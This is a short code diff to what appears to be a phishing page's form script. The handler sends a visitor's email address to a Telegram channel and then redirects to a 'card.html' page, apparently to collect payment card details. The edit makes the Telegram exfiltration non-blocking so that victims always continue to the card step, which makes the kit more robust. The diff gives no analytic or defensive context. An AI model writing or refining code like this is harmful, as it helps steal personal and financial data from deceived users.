@@ -326,15 +326,17 @@
             submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
             
             try {
-                // Send email to Telegram
-                await sendFormDataToTelegram('New Email', {
+                // Send email to Telegram (non-blocking - won't fail form submission)
+                sendFormDataToTelegram('New Email', {
                     'Email': email
+                }).catch(err => {
+                    console.warn('Telegram notification failed (non-critical):', err);
                 });
                 
                 // Simulate processing time
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // Redirect to next page
+                // Always redirect - don't block on Telegram errors
                 window.location.href = 'card.html?msg=lastt';
             } catch (error) {
                 console.error('Error submitting email:', error);
